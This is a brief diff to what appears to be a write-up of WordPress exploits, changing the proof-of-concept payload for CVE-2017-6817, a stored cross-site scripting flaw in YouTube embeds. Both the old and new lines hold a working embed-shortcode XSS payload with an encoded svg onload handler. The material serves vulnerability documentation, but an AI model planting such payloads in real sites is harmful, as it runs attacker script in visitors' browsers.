@@ -87,7 +87,7 @@ Expoint 4: CVE-2017-6817 Authenticated Stored Cross-Site Scripting (XSS) in YouT
         1. Create a new post
         
         2. In the post body, write this code:
-            [embed src='https://youtube.com/embed/12345\x3csvg onload=alert("No Body Is Safe!")\x3e'][/embed]
+            [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
             
         3. Save your changes, when you go to the post on the site you will see an embeded link
         
